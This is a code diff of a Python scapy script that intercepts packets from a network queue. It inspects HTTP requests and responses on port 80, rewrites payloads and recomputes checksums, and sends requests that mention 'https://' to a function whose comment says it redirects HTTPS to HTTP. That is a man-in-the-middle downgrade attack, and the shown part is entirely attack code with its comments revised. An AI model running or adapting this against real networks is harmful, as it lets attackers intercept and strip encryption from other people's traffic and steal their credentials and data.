@@ -86,32 +86,31 @@ def intercept_packet(packet):
 # modified to call intercept_packet
 def process_packet(packet):
     print("[+] Packet intercepted: ")
-    print(packet.get_payload())
+    
     print("--------------------------------------------------")
-
     # Convert packet to scapy packet
     scapy_packet = IP(packet.get_payload())
     
-
-    # Check if packet is a HTTP request
+    # check if the packet is a TCP packet and has a Raw layer
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
+        # if the packet is a request
         if scapy_packet[TCP].dport == 80:
             print("[+] TCP ...")
             load = scapy_packet[Raw].load.decode()
 
+            # whats in playload?
             print("Before modification: \n")
             print(load)
 
-            # Check if the request is trying to establish a secure connection
+            # if it is trying to access HTTPS, redirect to HTTP
             if 'https://' in load:
-                # If it is, call the intercept_packet function to handle it
                 print("[+] HTTPS ...")
-                intercept_packet(scapy_packet)
+                intercept_packet(scapy_packet) # call intercept_packet function to handle HTTPS 
 
             elif 'http://' in load:
                 print("[+] HTTP ...")
 
-                # Don't do anything if the request is already HTTP
+                # Don't do anything
 
                 scapy_packet[Raw].load = load.encode()
                 del scapy_packet[IP].len
@@ -119,9 +118,8 @@ def process_packet(packet):
                 del scapy_packet[TCP].chksum
                 packet.set_payload(bytes(scapy_packet))
 
-    # Check if packet is a HTTP response
-    elif scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
-        if scapy_packet[TCP].sport == 80:
+        # if the packet is a response
+        elif scapy_packet[TCP].sport == 80:
             print("[+] HTTP Response...")
             load = scapy_packet[Raw].load.decode()
 
